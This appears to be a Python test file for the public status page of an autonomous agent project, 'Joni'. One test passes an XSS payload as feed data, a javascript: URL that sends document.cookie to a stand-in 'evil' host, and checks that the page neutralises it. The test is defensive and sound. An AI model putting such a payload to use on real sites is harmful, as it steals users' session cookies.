"""The public site surfaces what Joni is doing. The human-task and forum surfaces (core
asks, Aufträge an Claude, the forum post-mappe) were retired when the autonomous loop was
stopped, so they no longer render; the expert-panel card and the rest stay."""

from joni.autonomy import site
from joni.autonomy.core_state import CoreState, seed_core


def _data(ext: dict) -> dict:
    cs = CoreState(seed_core())
    return {
        "snapshot": cs.snapshot(),
        "budget": {"spent_eur": 0.0, "cap_eur": 20.0, "runs": 1},
        "window": {"start": "2026-06-14T00:00:00+00:00", "runs": 1, "retired": False},
        "extensions": ext,
        "protocol": [],
        "generated": "2026-06-14T17:00:00+00:00",
    }


def test_site_shows_the_persona_lessons():
    data = _data({})
    data["persona"] = [{
        "theme": "routing", "depth": 3, "trigger_kind": "resolved_conflict",
        "heuristic": "3 korrigierte Irrtümer auf 'routing'.", "heuristic_phrased": None,
        "anchors": [{"before": "local-first always", "after": "load-dependent",
                     "trigger": "operator: corroborated under load"}], "trail": ["C-1"]}]
    html = site.build(data)
    assert "Jonis Persona" in html
    assert "routing" in html and "load-dependent" in html


def test_site_shows_the_conflict_resolution_map():
    data = _data({})
    data["resolve"] = [{"conflict_id": "X-7", "topic": "routing",
                        "a": {"id": "C-1", "text": "local-first always", "support": 0},
                        "b": {"id": "C-2", "text": "load-dependent", "support": 2}}]
    html = site.build(data)
    assert "Konflikt-Mappe" in html and "X-7" in html
    assert "conflict_decisions.txt" in html         # tells the operator where to decide


def test_a_javascript_url_from_a_source_is_never_a_clickable_link():
    # URLs on the public page come from external feeds (arXiv/OpenAlex/forum/doktores metadata);
    # a javascript:/data: scheme must be neutralised to '#', not rendered as an href.
    data = _data({
        "notes": [{"note": "a note", "source": "javascript:fetch('//evil/'+document.cookie)"}],
        "doktores_review": [{"title": "paper", "url": "javascript:alert(1)", "cycle": 1}],
    })
    html = site.build(data)
    assert "javascript:" not in html                    # no dangerous scheme reaches the page
    assert "href='#'" in html                            # it was dropped to a safe fragment


def test_a_normal_http_source_url_still_renders():
    data = _data({"notes": [{"note": "n", "source": "https://arxiv.org/abs/2401.1"}]})
    html = site.build(data)
    assert "https://arxiv.org/abs/2401.1" in html


def test_site_persona_and_resolve_are_empty_by_default():
    html = site.build(_data({}))
    assert "Noch keine Lehre" in html and "Gerade nichts zu entscheiden" in html


def test_site_keeps_auftraege_but_drops_the_retired_ask_and_forum_surfaces():
    # 'Aufträge an Claude' (Joni's programming suggestions) stay on the site; the core-asks card and
    # the forum post-mappe were retired.
    html = site.build(_data({
        "forum_outbox": [{"id": "FA-1-aaa", "platform": "moltbook", "question": "Q?",
                          "status": "posted", "posted_url": "https://www.moltbook.com/posts/p1"}],
        "forum_heard": [{"cycle": 1, "platform": "moltbook", "handle": "agentX", "claim": "C-9",
                         "text": "Dein Punkt ignoriert drift.", "treated_as": "source"}],
        "commissions": [{"title": "do a thing", "component": "x"}],
        "asks": [{"request_type": "observation", "component": "core", "proposed_change": "y"}]}))
    assert "Aufträge an Claude" in html and "do a thing" in html      # the suggestions are shown
    for absent in ("Menschen &amp; Foren", "Asks &mdash; waiting",
                   "du postest", "moltbook.com/posts/p1", "agentX"):
        assert absent not in html


def test_site_shows_what_the_expert_panel_discussed():
    html = site.build(_data({"panel_last": {
        "question": "Joni holds two claims in a hard contradiction:\n- (C-5) routing is local\n"
                    "- (C-6) routing is never local",
        "roles": {"claude": "assessor", "chatgpt": "adversarial", "deepseek": "consistency"},
        "phase3": {"claude": "Consistent only if 'local' is scoped to latency-bound tasks.",
                   "chatgpt": "Counter-assumption: under cost pressure the second claim wins.",
                   "deepseek": "The two resolve by separating the deployment assumption."},
        "cycle": 42}}))
    assert "Expertenrunde" in html
    assert "assessor" in html and "adversarial" in html and "consistency" in html
    assert "latency-bound tasks" in html                 # an actual assessment is shown
    assert "Joni entscheidet" in html                    # advisory framing preserved


def test_site_panel_card_is_empty_until_a_round_happens():
    html = site.build(_data({}))
    assert "Expertenrunde" in html
    assert "Noch keine Runde" in html


def test_site_shows_collapse_resistance_widget():
    data = _data({})
    data["collapse"] = {"overall": "warn", "metrics": {
        "top_bucket_dominance": {"level": "alarm"}, "novelty": {"level": "warn"},
        "degeneracy": {"level": "ok"}, "conflict_depth": {"level": "ok"},
        "topic_entropy": {"level": "ok"}, "weak_claim_ratio": {"level": "ok"},
        "repetition": {"level": "ok"}, "cold_replay": {"level": "ok"}}}
    html = site.build(data)
    assert "Collapse-Resistance" in html and "WARN" in html
    assert "Bucket" in html and "Novelty" in html            # per-metric dots render
    # backward-compatible: without a collapse row, no widget and no crash
    assert "Collapse-Resistance" not in site.build(_data({}))
